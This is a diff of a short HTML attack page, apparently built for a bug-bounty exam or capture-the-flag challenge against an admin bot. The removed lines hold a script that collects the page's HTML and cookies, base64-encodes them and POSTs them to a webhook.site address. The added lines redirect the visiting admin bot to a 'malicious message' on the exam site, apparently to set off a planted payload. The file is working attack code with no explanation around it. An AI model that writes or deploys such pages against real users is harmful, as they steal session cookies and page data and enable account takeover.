@@ -1,24 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Audit</title></head>
+<head>
+    <title>Loading...</title>
+</head>
 <body>
     <script>
-    (async function() {
-    const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
-    
-    // This grabs the hidden flag from the Next.js page state or the body
-    const content = document.documentElement.innerHTML;
-    const cookies = document.cookie;
+        // REPLACE '12345' with the actual ID of the message you sent
+        const messageId = '69eaa41cbee6d6b7c66466e4'; 
+        const targetUrl = 'https://bugbounty-exam.hashacademy.co/dashboard/messages/' + messageId;
 
-    fetch(webhook, {
-        method: 'POST',
-        body: btoa(JSON.stringify({ 
-            data: content, 
-            vault: cookies,
-            location: window.location.href 
-        }))
-    });
-})();
+        console.log("Redirecting Admin to the trap...");
+        
+        // This forces the AdminBot to navigate to your malicious message
+        window.location.href = targetUrl;
     </script>
 </body>
 </html>
